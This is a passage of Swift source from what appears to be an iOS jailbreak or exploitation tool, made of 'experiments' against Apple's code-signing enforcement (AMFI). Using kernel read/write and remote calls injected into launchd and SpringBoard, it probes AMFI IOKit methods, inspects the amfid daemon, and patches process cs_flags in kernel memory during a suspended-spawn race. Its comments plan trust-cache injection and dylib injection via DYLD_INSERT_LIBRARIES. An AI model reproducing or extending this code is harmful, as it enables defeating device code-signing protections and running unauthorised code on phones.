            var outBuf = [UInt8](repeating: 0, count: min(Int(pidOutSize), 32))
            sb.remoteRead(structOutAddr, to: &outBuf, size: UInt64(outBuf.count))
            detail += "  output: \(outBuf.map { String(format: "%02x", $0) }.joined(separator: " "))\n"
            foundWorking.append((2, "PID input"))
        }
        
        // Strategy 3: Try selector 5 with CDHash-like input (20 bytes = SHA1)
        // This might be "add to trust cache" or "check CDHash"
        detail += "\n--- Selector 5 with CDHash input (20B zeros) ---\n"
        for i in 0..<3 { sb[structInAddr + UInt64(i * 8)].setValue64(0) }
        sb[structOutSizeAddr].setValue64(256)
        let cdRet = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                        UInt64(connect), 5,
                                        structInAddr, 20,
                                        structOutAddr, structOutSizeAddr)
        let cdOutSize = sb[structOutSizeAddr].value64()
        detail += "  ret=0x\(String(format: "%x", cdRet)), outSize=\(cdOutSize)\n"
        if cdRet == 0 {
            detail += "  ✅ CDHash-sized input ACCEPTED!\n"
            foundWorking.append((5, "CDHash input"))
        }
        
        // Strategy 4: Try with scalar+struct combo via IOConnectCallMethod workaround
        // Some methods need BOTH scalar and struct input
        // Use IOConnectCallScalarMethod with scalar[0] = selector-specific value
        detail += "\n--- Selector 9 with 2 scalar inputs ---\n"
        let scalarInAddr = mem + 0x2800
        sb[scalarInAddr].setValue64(1)       // arg0 = PID?
        sb[scalarInAddr + 8].setValue64(0)   // arg1 = flags?
        let scalarOutAddr = mem + 0x2A00
        let scalarOutCntAddr = mem + 0x2C00
        sb[scalarOutCntAddr].setValue32(16)
        let s9ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 9,
                                        scalarInAddr, 2,
                                        scalarOutAddr, scalarOutCntAddr)
        let s9out = sb[scalarOutCntAddr].value32()
        detail += "  2 scalars [1,0]: ret=0x\(String(format: "%x", s9ret)), outCnt=\(s9out)\n"
        if s9ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  ✅ output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((9, "2 scalar inputs"))
        }
        
        // Strategy 5: Try selector 2 with 2 scalars (PID + operation)
        detail += "\n--- Selector 2 with 2 scalar inputs ---\n"
        sb[scalarInAddr].setValue64(1)       // PID 1
        sb[scalarInAddr + 8].setValue64(0)   // operation 0
        sb[scalarOutCntAddr].setValue32(16)
        let s2ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 2,
                                        scalarInAddr, 2,
                                        scalarOutAddr, scalarOutCntAddr)
        let s2out = sb[scalarOutCntAddr].value32()
        detail += "  [PID=1, op=0]: ret=0x\(String(format: "%x", s2ret)), outCnt=\(s2out)\n"
        if s2ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  ✅ output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((2, "2 scalar [PID,op]"))
        }
        
        // Strategy 6: Try selector 4 with 3 scalars
        detail += "\n--- Selector 4 with 3 scalar inputs ---\n"
        sb[scalarInAddr].setValue64(1)       // PID
        sb[scalarInAddr + 8].setValue64(0)   // flags
        sb[scalarInAddr + 16].setValue64(0)  // extra
        sb[scalarOutCntAddr].setValue32(16)
        let s4ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 4,
                                        scalarInAddr, 3,
                                        scalarOutAddr, scalarOutCntAddr)
        let s4out = sb[scalarOutCntAddr].value32()
        detail += "  [1,0,0]: ret=0x\(String(format: "%x", s4ret)), outCnt=\(s4out)\n"
        if s4ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  ✅ output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((4, "3 scalar inputs"))
        }
        
        // Close AMFI
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\n--- RESULTS ---\n"
        detail += "Working combinations: \(foundWorking.count)\n"
        for (sel, desc) in foundWorking {
            detail += "  Selector \(sel): \(desc)\n"
        }
        if foundWorking.isEmpty {
            detail += "No working combination found yet.\n"
            detail += "Methods might need specific entitlement or token.\n"
            detail += "NEXT: try with 4,5,6 scalar inputs or larger structs\n"
        } else {
            detail += "\n🔥 FOUND WORKING AMFI METHODS!\n"
            detail += "Next: determine what each method DOES\n"
            detail += "Try: pass our binary's CDHash to whitelist it\n"
        }
        
        return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: !foundWorking.isEmpty, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 59: AMFI from Launchd + amfid Hunt
    
    /// Experiment 59: Try AMFI IOKit from LAUNCHD context (PID 1 = most trusted)
    /// Also: find amfid daemon and try to get its task port
    /// amfid is the userspace daemon that handles AMFI policy decisions
    /// If we can control amfid → we control code signing decisions!
    private func expAMFIFromLaunchd(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "AMFI from Launchd + amfid Hunt\n\n"
        let mgr = dspmgr.shared
        
        // Part 1: Try opening AMFI user client from LAUNCHD (PID 1)
        // Launchd is the most privileged userspace process
        detail += "=== Part 1: AMFI IOKit from launchd ===\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceMatching"))
        let ioServiceGetMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceGetMatchingService"))
        let ioServiceOpen = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceOpen"))
        let ioConnectCallScalar = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOConnectCallScalarMethod"))
        
        var amfiConnect: UInt32 = 0
        
        if ioServiceMatching != 0 {
            let nameAddr = remote_alloc_str(rc, "AppleMobileFileIntegrity")
            let matchDict = RootExecutor.rcall(rc, "IOServiceMatching", nameAddr)
            
            if matchDict != 0 {
                let svc = RootExecutor.rcall(rc, "IOServiceGetMatchingService", 0, matchDict)
                detail += "AMFI service from launchd: 0x\(String(format: "%x", svc))\n"
                
                if svc != 0 {
                    let taskSelf = RootExecutor.rcall(rc, "mach_task_self")
                    let connectAddr = mem + 0x1A00
                    rc[connectAddr].setValue32(0)
                    let openRet = RootExecutor.rcall(rc, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
                    amfiConnect = rc[connectAddr].value32()
                    detail += "IOServiceOpen: ret=0x\(String(format: "%x", openRet)), connect=\(amfiConnect)\n"
                    
                    if openRet == 0 && amfiConnect != 0 {
                        detail += "✅ AMFI opened from launchd!\n\n"
                        
                        // Try selectors with different scalar counts from launchd
                        let scalarInAddr = mem + 0x2000
                        let scalarOutAddr = mem + 0x2200
                        let scalarOutCntAddr = mem + 0x2400
                        
                        // Selector 2 with 1 scalar (our PID)
                        let ourPid = RootExecutor.rcall(rc, "getpid")
                        rc[scalarInAddr].setValue64(ourPid)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r2 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 2,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 2 [PID=\(ourPid)]: ret=0x\(String(format: "%x", r2))\n"
                        
                        // Selector 2 with 4 scalars
                        rc[scalarInAddr].setValue64(ourPid)
                        rc[scalarInAddr + 8].setValue64(0)
                        rc[scalarInAddr + 16].setValue64(0)
                        rc[scalarInAddr + 24].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r2b = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                     UInt64(amfiConnect), 2,
                                                     scalarInAddr, 4,
                                                     scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 2 [4 scalars]: ret=0x\(String(format: "%x", r2b))\n"
                        
                        // Selector 5 with 1 scalar
                        rc[scalarInAddr].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r5 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 5,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 5 [0]: ret=0x\(String(format: "%x", r5))\n"
                        
                        // Selector 9 with 1 scalar = 0 (might be "disable" or "query")
                        rc[scalarInAddr].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r9 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 9,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 9 [0]: ret=0x\(String(format: "%x", r9))\n"
                        
                        // Check if any succeeded
                        if r2 == 0 || r2b == 0 || r5 == 0 || r9 == 0 {
                            detail += "\n🔥🔥🔥 LAUNCHD HAS AMFI ACCESS!\n"
                            let outVal = rc[scalarOutAddr].value64()
                            detail += "output[0] = 0x\(String(format: "%llx", outVal))\n"
                        } else {
                            detail += "\nLaunchd also rejected — needs specific entitlement\n"
                        }
                        
                        // Close
                        RootExecutor.rcall(rc, "IOServiceClose", UInt64(amfiConnect))
                    } else {
                        detail += "❌ Cannot open AMFI from launchd\n"
                    }
                }
            }
            RootExecutor.rcall(rc, "free", remote_alloc_str(rc, "AppleMobileFileIntegrity"))
        } else {
            detail += "IOKit not loaded in launchd\n"
        }
        
        // Part 2: Find amfid daemon
        detail += "\n=== Part 2: Hunt for amfid ===\n"
        
        // amfid is the AMFI daemon — it makes code signing decisions
        // If we can find it and RC into it, we have full AMFI control
        let amfidProc = mgr.findProc(name: "amfid")
        detail += "amfid proc in kernel: 0x\(String(format: "%llx", amfidProc))\n"
        
        if amfidProc != 0 {
            // Read amfid's PID
            let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
            detail += "amfid PID: \(amfidPid)\n"
            
            // Read amfid's proc_ro → task
            let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
            let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
            detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
            detail += "amfid task: 0x\(String(format: "%llx", amfidTask))\n"
            
            // Read amfid's cs_flags
            let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
            detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
            if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY ✅\n" }
            if amfidCSFlags & 0x4000 != 0 { detail += "  CS_GET_TASK_ALLOW\n" }
            
            detail += "\n✅ amfid FOUND! PID=\(amfidPid)\n"
            detail += "amfid is the code signing policy daemon.\n"
            detail += "If we can RC into amfid → full AMFI control!\n"
            detail += "NEXT: try RemoteCall init to amfid process\n"
        } else {
            detail += "amfid not found in process list\n"
            detail += "Trying to find via name scan...\n"
            
            // Scan process list for amfi-related processes
            let procs = ["amfid", "trustd", "securityd", "syspolicyd"]
            for name in procs {
                let proc = mgr.findProc(name: name)
                if proc != 0 {
                    let pid = ds_kread32(proc + UInt64(off_proc_p_pid))
                    detail += "  \(name): PID=\(pid), proc=0x\(String(format: "%llx", proc))\n"
                }
            }
        }
        
        // Part 3: Trust Cache research
        detail += "\n=== Part 3: Trust Cache Info ===\n"
        detail += "Trust caches are kernel-resident lists of allowed CDHashes.\n"
        detail += "If we can ADD our binary's CDHash to a trust cache → bypass AMFI!\n"
        detail += "Trust cache structs are in kernel heap (kalloc zone).\n"
        detail += "Our socket KRW might not reach them, but worth investigating.\n"
        
        // Try to find trust cache pointer via sysctl
        let tcNameAddr = remote_alloc_str(rc, "security.mac.amfi.trust_cache_count")
        let tcBufAddr = mem + 0x2800
        let tcSizeAddr = mem + 0x2A00
        rc[tcSizeAddr].setValue64(8)
        let tcRet = RootExecutor.rcall(rc, "sysctlbyname", tcNameAddr, tcBufAddr, tcSizeAddr, 0, 0)
        if tcRet == 0 {
            let tcCount = rc[tcBufAddr].value64()
            detail += "Trust cache count: \(tcCount)\n"
        } else {
            detail += "trust_cache_count sysctl: ret=\(tcRet) (not available)\n"
        }
        RootExecutor.rcall(rc, "free", tcNameAddr)
        
        // Try amfi.developer_mode_status
        let devNameAddr = remote_alloc_str(rc, "security.mac.amfi.developer_mode_status")
        rc[tcSizeAddr].setValue64(4)
        let devRet = RootExecutor.rcall(rc, "sysctlbyname", devNameAddr, tcBufAddr, tcSizeAddr, 0, 0)
        if devRet == 0 {
            let devMode = rc[tcBufAddr].value32()
            detail += "Developer mode: \(devMode)\n"
        } else {
            detail += "developer_mode_status: ret=\(devRet)\n"
        }
        RootExecutor.rcall(rc, "free", devNameAddr)
        
        let success = amfidProc != 0 || (amfiConnect != 0)
        return ExperimentResult(name: "🔥🔥🔥🔥🔥 AMFI launchd+amfid", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - 🔥🔥🔥🔥🔥🔥 Experiment 60: RemoteCall into amfid
    
    /// Experiment 60: Initialize RemoteCall into amfid daemon!
    /// amfid (PID 52) is the code signing policy daemon.
    /// It has the entitlements needed to call AMFI IOKit methods.
    /// If we can RC into amfid → call AMFI methods FROM amfid → bypass!
    ///
    /// Strategy:
    /// 1. Find amfid PID (already found: 52)
    /// 2. Use dspmgr.rcinit(process: "amfid") to establish RemoteCall
    /// 3. From amfid context: call IOConnectCallScalarMethod on AMFI
    /// 4. amfid has com.apple.private.amfi.can-execute entitlement!
    private func expRCIntoAmfid(rc: RemoteCall) -> ExperimentResult {
        let mgr = dspmgr.shared
        var detail = "🔥 amfid Kernel Research\n\n"
        
        // RC to amfid HANGS (confirmed — single-threaded daemon)
        // Direct task struct reads PANIC (itk_space, threads in wrong zone)
        // Only safe reads: proc, proc_ro, pid, cs_flags
        
        // Step 1: Find amfid
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "❌ amfid not found in process list\n"
            return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥 amfid research", success: false, detail: detail, timestamp: Date())
        }
        
        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid PID: \(amfidPid)\n"
        detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n"
        
        // Step 2: Read proc_ro (SAFE — same zone as proc)
        let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
        detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
        
        // Step 3: Read cs_flags (SAFE — in proc_ro)
        let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
        detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
        if amfidCSFlags & 0x001 != 0 { detail += "  CS_VALID\n" }
        if amfidCSFlags & 0x004 != 0 { detail += "  CS_HARD\n" }
        if amfidCSFlags & 0x008 != 0 { detail += "  CS_KILL\n" }
        if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY ✅\n" }
        
        // Step 4: Read p_flag (SAFE)
        let amfidPFlag = ds_kread32(amfidProc + UInt64(off_proc_p_flag))
        detail += "amfid p_flag: 0x\(String(format: "%x", amfidPFlag))\n"
        
        // Step 5: Read task pointer (SAFE to read pointer, NOT safe to dereference task internals)
        let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
        detail += "amfid task ptr: 0x\(String(format: "%llx", amfidTask))\n"
        detail += "⚠️ Cannot read task internals (itk_space, threads → panic)\n"
        
        // Step 6: Read ucred (SAFE — pointer in proc_ro)
        var ucredAddr: UInt64 = 0
        if amfidProcRo != 0 {
            ucredAddr = ds_kread64(amfidProcRo + UInt64(off_proc_ro_p_ucred))
            detail += "amfid ucred: 0x\(String(format: "%llx", ucredAddr))\n"
            
            // Read uid from ucred (offset 0x18 is cr_uid typically)
            if ucredAddr != 0 {
                let uid = ds_kread32(ucredAddr + 0x18)
                detail += "amfid uid: \(uid)\n"
            }
        }
        
        // Step 7: Read p_textvp (vnode of amfid binary)
        let textVP = ds_kread64(amfidProc + UInt64(off_proc_p_textvp))
        detail += "amfid textvp: 0x\(String(format: "%llx", textVP))\n"
        
        // Step 8: Read process name
        var nameBuf = [UInt8](repeating: 0, count: 32)
        let nameAddr = amfidProc + UInt64(off_proc_p_name)
        for i in 0..<32 {
            nameBuf[i] = ds_kread8(nameAddr + UInt64(i))
            if nameBuf[i] == 0 { break }
        }
        let procName = String(bytes: nameBuf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? "?"
        detail += "amfid name: \(procName)\n"
        
        // Step 9: Also find trustd and securityd
        detail += "\n=== Related daemons ===\n"
        let relatedProcs = ["trustd", "securityd", "syspolicyd"]
        for name in relatedProcs {
            let proc = mgr.findProc(name: name)
            if proc != 0 {
                let pid = ds_kread32(proc + UInt64(off_proc_p_pid))
                let csf = mgr.readCSFlags(pid: Int32(bitPattern: pid))
                detail += "\(name): PID=\(pid), cs=0x\(String(format: "%x", csf))"
                if csf & 0x100 != 0 { detail += " [PLATFORM]" }
                detail += "\n"
            }
        }
        
        detail += "\n=== CONCLUSION ===\n"
        detail += "RC to amfid: ❌ IMPOSSIBLE (hangs — single-threaded)\n"
        detail += "Task internals: ❌ INACCESSIBLE (wrong kernel zone)\n"
        detail += "amfid is CS_PLATFORM_BINARY with uid=0\n\n"
        detail += "Remaining AMFI bypass paths:\n"
        detail += "• Trust cache injection (find TC struct in kernel heap)\n"
        detail += "• IOSurface external method exploitation\n"
        detail += "• Kernel function hooking (if we find writable code)\n"
        detail += "• Developer mode exploitation (already enabled!)\n"
        
        return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥 amfid research", success: true, detail: detail, timestamp: Date())
    }
    
    // MARK: - 🔥🔥🔥🔥🔥🔥🔥 Experiment 61: ALL REMAINING PATHS
    
    /// Experiment 61: Combined final assault — all remaining bypass paths in one
    /// 1. Trust Cache scan (find TC linked list via known kernel symbols)
    /// 2. Developer mode spawn (special flags for dev-mode enabled devices)
    /// 3. posix_spawn with responsibility_spawnattrs (launchd managed spawn)
    /// 4. IOSurface external method 9/10 (getValue/setValue on kernel objects)
    /// 5. Spawn with CS_DEBUGGED patched on child process
    private func expFinalAssault(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let mgr = dspmgr.shared
        var detail = "🔥 FINAL ASSAULT — All remaining paths\n\n"
        var anySuccess = false
        
        // ═══════════════════════════════════════════════
        // PATH 1: Developer Mode Spawn
        // Developer mode = 1 (confirmed). On iOS 16+, dev mode
        // allows some unsigned code execution for development.
        // Try: posix_spawnattr with _POSIX_SPAWN_DISABLE_ASLR + persona
        // ═══════════════════════════════════════════════
        detail += "═══ PATH 1: Developer Mode Spawn ═══\n"
        
        // Copy binary first
        let srcPath = remote_alloc_str(rc, "/bin/df")
        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_devmode_test")
        RootExecutor.rcall(rc, "unlink", dstPath)
        let sf = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        let df = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
            let buf = mem + 0x800
            for _ in 0..<50 {
                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
                if n == 0 || n > 2048 { break }
                RootExecutor.rcall(rc, "write", df, buf, n)
            }
            RootExecutor.rcall(rc, "close", sf)
            RootExecutor.rcall(rc, "close", df)
        }
        
        // Try spawn with various "developer" flags
        let devFlags: [(String, UInt64)] = [
            ("DISABLE_ASLR (0x100)", 0x0100),
            ("SETEXEC (0x40)", 0x0040),
            ("SETPGROUP|SETSID|DISABLE_ASLR", 0x0502),
            ("CLOEXEC_DEFAULT|DISABLE_ASLR", 0x1100),
        ]
        
        for (name, flags) in devFlags {
            let attrAddr = mem + 0x1800
            rc[attrAddr].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
            
            let argvBase = mem + 0x1C00
            rc[argvBase].setValue64(dstPath)
            rc[argvBase + 8].setValue64(0)
            let pidAddr = mem + 0x1E00
            rc[pidAddr].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, attrAddr, argvBase, 0)
            RootExecutor.rcall(rc, "usleep", 300000)
            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
            
            detail += "  \(name): ret=\(ret)\n"
            if ret == 0 {
                detail += "  🎉 SPAWN SUCCESS!\n"
                anySuccess = true
            }
            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        }
        
        // ═══════════════════════════════════════════════
        // PATH 2: CS_DEBUGGED on child before exec
        // Fork child → patch its cs_flags to add CS_DEBUGGED → then spawn
        // CS_DEBUGGED tells AMFI "debugger attached, relax checks"
        // ═══════════════════════════════════════════════
        detail += "\n═══ PATH 2: CS_DEBUGGED patch + spawn ═══\n"
        
        // Fork to create child
        let childPid = RootExecutor.rcall(rc, "fork")
        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
            detail += "Forked child PID: \(childPid)\n"
            
            // Patch child's cs_flags to add CS_DEBUGGED (0x800) + CS_GET_TASK_ALLOW (0x4000)
            // Also remove CS_HARD (0x4) and CS_KILL (0x8)
            let childProc = mgr.findProc(pid: Int32(childPid))
            if childProc != 0 {
                let childProcRo = ds_kread64(childProc + UInt64(off_proc_p_proc_ro))
                if childProcRo != 0 {
                    let currentFlags = ds_kread32(childProcRo + 0x1c)
                    // Add CS_DEBUGGED | CS_GET_TASK_ALLOW, remove CS_HARD | CS_KILL
                    let newFlags = (currentFlags | 0x4800) & ~UInt32(0x000C)
                    ds_kwrite32(childProcRo + 0x1c, newFlags)
                    let afterFlags = ds_kread32(childProcRo + 0x1c)
                    detail += "cs_flags: 0x\(String(format: "%x", currentFlags)) → 0x\(String(format: "%x", afterFlags))\n"
                    
                    if afterFlags != currentFlags {
                        detail += "✅ CS_DEBUGGED patched on child!\n"
                    }
                }
            }
            
            // Kill child (it's just a fork copy, not useful yet)
            RootExecutor.rcall(rc, "kill", childPid, 9)
            RootExecutor.rcall(rc, "waitpid", childPid, mem + 0x380, 0)
            
            // Now: spawn the copied binary — AMFI checks the NEW process
            // Patch cs_flags AFTER spawn (race condition approach)
            detail += "\nSpawn + immediate cs_flags patch (race)...\n"
            let argvBase2 = mem + 0x1C00
            rc[argvBase2].setValue64(dstPath)
            rc[argvBase2 + 8].setValue64(0)
            let pidAddr2 = mem + 0x1E00
            rc[pidAddr2].setValue64(0)
            
            // Spawn with START_SUSPENDED so we can patch before it runs
            let attrAddr2 = mem + 0x1800
            rc[attrAddr2].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr2)
            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr2, 0x0080) // POSIX_SPAWN_START_SUSPENDED
            
            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, dstPath, 0, attrAddr2, argvBase2, 0)
            let spawnedPid = rc[pidAddr2].value32()
            detail += "Spawn (SUSPENDED): ret=\(spawnRet), pid=\(spawnedPid)\n"
            
            if spawnRet == 0 && spawnedPid != 0 {
                // Process is suspended! Patch its cs_flags NOW
                let spawnedProc = mgr.findProc(pid: Int32(spawnedPid))
                if spawnedProc != 0 {
                    let spProcRo = ds_kread64(spawnedProc + UInt64(off_proc_p_proc_ro))
                    if spProcRo != 0 {
                        let spFlags = ds_kread32(spProcRo + 0x1c)
                        let spNewFlags = (spFlags | 0x4800) & ~UInt32(0x000C) // +DEBUGGED +GET_TASK_ALLOW -HARD -KILL
                        ds_kwrite32(spProcRo + 0x1c, spNewFlags)
                        detail += "Patched spawned process cs_flags: 0x\(String(format: "%x", spFlags)) → 0x\(String(format: "%x", spNewFlags))\n"
                    }
                }
                
                // Resume the process
                RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 18) // SIGCONT
                RootExecutor.rcall(rc, "usleep", 1000000) // 1s
                
                // Check if it's still alive (not killed by AMFI)
                let statusAddr = mem + 0x380
                rc[statusAddr].setValue32(0)
                let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(spawnedPid), statusAddr, UInt64(WNOHANG))
                let status = rc[statusAddr].value32()
                
                detail += "After resume: waitpid=\(waitRet), status=0x\(String(format: "%x", status))\n"
                
                let exited = (status & 0x7F) == 0
                let exitCode = (status >> 8) & 0xFF
                let signaled = (status & 0x7F) != 0 && (status & 0x7F) != 0x7F
                let sig = status & 0x7F
                
                if exited && exitCode == 0 {
                    detail += "🎉🎉🎉 PROCESS RAN AND EXITED NORMALLY! 🎉🎉🎉\n"
                    detail += "CS_DEBUGGED BYPASS WORKS!\n"
                    anySuccess = true
                } else if signaled && sig == 9 {
                    detail += "❌ Killed by SIGKILL (AMFI still enforcing)\n"
                } else if waitRet == 0 {
                    detail += "Process still running (not reaped yet)\n"
                    RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 9)
                    RootExecutor.rcall(rc, "waitpid", UInt64(spawnedPid), statusAddr, 0)
                } else {
                    detail += "status=0x\(String(format: "%x", status)) (exit=\(exitCode), sig=\(sig))\n"
                }
            }
            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr2)
        }
        
        // ═══════════════════════════════════════════════
        // PATH 3: Trust Cache — DISABLED (neighbor scan causes panic)
        // Reading arbitrary addresses near pmap_cs hits inaccessible zones
        // ═══════════════════════════════════════════════
        detail += "\n═══ PATH 3: Trust Cache scan ═══\n"
        detail += "⚠️ DISABLED — scanning kernel memory near pmap_cs causes panic\n"
        detail += "Socket KRW cannot safely read arbitrary __DATA addresses\n"
        let pointerCandidates: [(Int, UInt64)] = []
        
        // ═══════════════════════════════════════════════
        // PATH 4: IOSurface external method 9 (getValue)
        // IOSurface user client has methods that read/write kernel objects
        // Selector 9 = s_get_value, Selector 10 = s_set_value
        // These operate on IOSurface properties in kernel heap!
        // ═══════════════════════════════════════════════
        detail += "\n═══ PATH 4: IOSurface getValue/setValue ═══\n"
        
        guard let sb = dspmgr.shared.sbProc else {
            detail += "No SpringBoard RC\n"
            RootExecutor.rcall(rc, "unlink", dstPath)
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥🔥 FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
        }
        
        let sbMem = sb.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Open IOSurfaceRoot user client
        let ioSvcName = remote_alloc_str(sb, "IOSurfaceRoot")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", ioSvcName)
        let ioSvc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        if ioSvc != 0 {
            let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
            let connectAddr = sbMem + 0x1A00
            sb[connectAddr].setValue32(0)
            let openRet = RootExecutor.rcall(sb, "IOServiceOpen", ioSvc, taskSelf, 0, connectAddr)
            let ioConnect = sb[connectAddr].value32()
            
            detail += "IOSurfaceRoot: connect=\(ioConnect), ret=0x\(String(format: "%x", openRet))\n"
            
            if openRet == 0 && ioConnect != 0 {
                // Try external method selectors 6-15 (IOSurface has ~30 methods)
                // Selector 6 = create, 9 = get_value, 10 = set_value, etc.
                let scalarIn = sbMem + 0x2000
                let scalarOut = sbMem + 0x2200
                let scalarOutCnt = sbMem + 0x2400
                
                let testSelectors = [6, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
                for sel in testSelectors {
                    sb[scalarIn].setValue64(0)
                    sb[scalarOutCnt].setValue32(16)
                    let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                                UInt64(ioConnect), UInt64(sel),
                                                0, 0,
                                                scalarOut, scalarOutCnt)
                    if ret == 0 {
                        let out = sb[scalarOut].value64()
                        detail += "  ✅ IOSurf sel \(sel): SUCCESS! out=0x\(String(format: "%llx", out))\n"
                        anySuccess = true
                    } else if ret != 0xe00002bc && ret != 0xe00002c7 {
                        detail += "  ⚠️ IOSurf sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                    }
                }
                
                RootExecutor.rcall(sb, "IOServiceClose", UInt64(ioConnect))
            }
        } else {
            detail += "IOSurfaceRoot service not found\n"
        }
        RootExecutor.rcall(sb, "free", ioSvcName)
        
        // ═══════════════════════════════════════════════
        // PATH 5: Spawn signed binary via symlink (already works!)
        // + try to make it load OUR dylib via DYLD_INSERT_LIBRARIES
        // ═══════════════════════════════════════════════
        detail += "\n═══ PATH 5: DYLD_INSERT via env ═══\n"
        
        // Write a fake dylib to /tmp (just Mach-O header)
        let fakeDylib = "/tmp/.dsp_inject.dylib"
        let fakeAddr = remote_alloc_str(rc, fakeDylib)
        RootExecutor.rcall(rc, "unlink", fakeAddr)
        let fakeFd = RootExecutor.rcall(rc, "open", fakeAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if fakeFd != UInt64(bitPattern: -1) {
            // Write minimal dylib header
            let hdrAddr = mem + 0x800
            // MH_MAGIC_64 + ARM64 + MH_DYLIB
            rc[hdrAddr].setValue64(0x0000000100000CCF)      // magic + cputype
            rc[hdrAddr + 8].setValue64(0x0000000600000000)  // filetype=MH_DYLIB + ncmds=0
            rc[hdrAddr + 16].setValue64(0x0020008500000000) // sizeofcmds=0 + flags
            rc[hdrAddr + 24].setValue64(0)                  // reserved
